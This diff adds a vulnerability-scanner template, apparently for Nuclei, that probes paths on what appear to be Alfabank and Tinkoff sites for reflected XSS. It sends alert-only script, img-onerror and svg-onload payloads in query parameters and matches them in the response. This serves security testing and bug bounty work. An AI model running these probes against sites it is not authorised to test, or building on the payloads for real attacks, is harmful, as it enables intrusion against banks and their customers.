@@ -1,0 +1,34 @@
+id: alfabank-reflected-xss
+
+info:
+  name: Alfabank/Tinkoff - Reflected XSS
+  author: bugbounty
+  severity: high
+  description: Reflected XSS in various parameters
+  tags: xss,alfabank,tinkoff
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/404.html?page=<script>alert(1)</script>"
+      - "{{BaseURL}}/search/?text=<script>alert(document.domain)</script>"
+      - "{{BaseURL}}/feedback/support/?code=<img src=x onerror=alert(1)>"
+      - "{{BaseURL}}/api?page=<svg/onload=alert(1)>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert"
+          - "<img src=x onerror="
+          - "<svg/onload=alert"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
